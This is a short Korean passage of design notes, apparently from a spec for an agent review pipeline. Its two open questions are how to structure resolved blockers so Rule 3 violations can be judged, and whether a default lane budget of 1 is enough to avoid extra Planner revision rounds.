- `lane_verdict`를 원장에 추가했을 때 Rule 3 위반을 판정하려면 "해소된 blocker 집합"도 구조화가 필요하다. 현재 blocker는 마크다운 산문이므로, **findings 타입(§3.2)을 리뷰 전체로 확장**하면 자연히 해결될 가능성 — 설계 시 검토
- 레인 예산 기본값 1이 실전에서 충분한지 미검증. 리뷰어가 한 번에 모든 문제를 못 찾으면 불필요한 Planner 수정 라운드를 유발할 수 있음
